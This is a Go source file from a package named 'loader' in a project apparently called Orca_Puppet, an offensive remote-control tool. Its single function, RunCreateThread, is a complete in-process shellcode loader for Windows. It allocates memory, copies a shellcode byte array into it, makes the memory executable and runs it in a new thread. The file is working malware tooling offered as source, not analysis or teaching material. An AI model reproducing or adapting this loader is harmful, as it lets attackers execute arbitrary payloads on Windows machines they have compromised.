//go:build windows
// +build windows

package loader

import (
	"Orca_Puppet/define/colorcode"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func RunCreateThread(shellcode []byte, pid int) string {
	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	stdErr := ""
	if errVirtualAlloc != nil {
		message := fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		message := fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")

	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		message := fmt.Sprintf("Error calling CreateThread:\r\n%s", errCreateThread.Error())
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	return ""
}
